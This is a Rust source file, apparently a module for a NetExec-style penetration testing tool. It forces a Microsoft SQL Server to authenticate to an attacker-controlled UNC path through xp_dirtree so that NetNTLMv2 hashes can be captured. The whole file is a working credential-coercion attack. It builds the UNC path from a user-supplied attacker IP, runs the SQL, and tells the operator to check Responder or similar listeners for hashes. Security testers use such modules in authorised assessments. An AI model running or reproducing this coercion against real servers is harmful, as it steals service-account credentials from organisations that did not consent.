use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use nxc_protocols::{mssql::MssqlSession, mssql::MssqlProtocol, NxcSession};
use serde_json::json;
use tracing::info;

pub struct MssqlUnc {}

impl MssqlUnc {
    pub fn new() -> Self {
        Self {}
    }
}

impl Default for MssqlUnc {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for MssqlUnc {
    fn name(&self) -> &'static str {
        "mssql_unc"
    }

    fn description(&self) -> &'static str {
        "Forces MSSQL Server to authenticate against an attacker-controlled UNC path via xp_dirtree, capturing NetNTLM hashes."
    }

    fn supported_protocols(&self) -> &[&str] {
        &["mssql"]
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "UNC_IP".to_string(),
                description: "IP of the attacker machine (e.g. 10.10.14.5)".to_string(),
                required: true,
                default: None,
            },
            ModuleOption {
                name: "SHARE".to_string(),
                description: "Fake share name for the UNC".to_string(),
                required: false,
                default: Some("share".to_string()),
            },
        ]
    }

    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let mssql_sess = session
            .as_any()
            .downcast_ref::<MssqlSession>()
            .ok_or_else(|| anyhow!("Module requires an MSSQL session"))?;

        let attacker_ip = opts.get("UNC_IP").ok_or_else(|| anyhow!("UNC_IP is required"))?;
        let share = opts.get("SHARE").map(|s| s.as_str()).unwrap_or("share");

        info!("Starting MSSQL NTLM Coercion against {} to {}", mssql_sess.target, attacker_ip);

        let mut output = String::from("MSSQL UNC Coercion Results:\n");
        let mut coerced = false;

        let protocol = MssqlProtocol::new();
        let unc_path = format!("\\\\{}\\{}", attacker_ip, share);

        // We use xp_dirtree to trigger the authentication
        let sql = format!("EXEC master..xp_dirtree '{}', 1, 1;", unc_path);
        
        output.push_str(&format!("  [*] Executing: {}\n", sql));

        if let Ok(_) = protocol.query_json(mssql_sess, &sql).await {
            // Even if it returns no data or an error due to invalid path, the auth usually triggers
            coerced = true;
            output.push_str("  [+] xp_dirtree command executed!\n");
            output.push_str("      -> Check your listener (e.g., Responder, Inveigh, or nxc smb --server) for NetNTLMv2 hashes.\n");
        } else {
            output.push_str("  [-] Failed to execute xp_dirtree. The stored procedure may be disabled or you lack permissions.\n");
        }

        Ok(ModuleResult {
            success: coerced,
            output,
            data: json!({ "coerced": coerced, "unc_path": unc_path }),
            credentials: vec![],
        })
    }
}
